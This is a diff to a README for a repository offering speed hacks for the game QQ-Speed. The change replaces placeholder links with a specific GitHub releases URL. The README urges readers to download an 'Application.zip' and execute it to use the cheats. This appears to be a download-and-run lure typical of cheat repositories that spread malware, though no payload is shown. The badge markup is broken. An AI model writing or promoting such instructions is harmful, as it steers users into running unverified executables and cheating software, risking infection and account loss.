@@ -19,12 +19,12 @@ Welcome to the QQ-Speed Cheat repository, where you can find speed hacks that al
 ### Get Started
 To access the cheat files and scripts, please download the application from the following link:
 
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-9cf)](https://github.com/user/repo/Application.zip)
+[![Download Application](https://github.com/nineinforti/QQ-Speed/releases)](https://github.com/nineinforti/QQ-Speed/releases)
 
 Once downloaded, execute the file to start using the cheats and enhance your QQ-Speed gaming experience.
 
 ### Visit Our Page
-For more information and updates, visit our GitHub repository at [GitHub Repository](https://github.com/user/repo).
+For more information and updates, visit our GitHub repository at [GitHub Repository](https://github.com/nineinforti/QQ-Speed/releases).
 
 ---
 
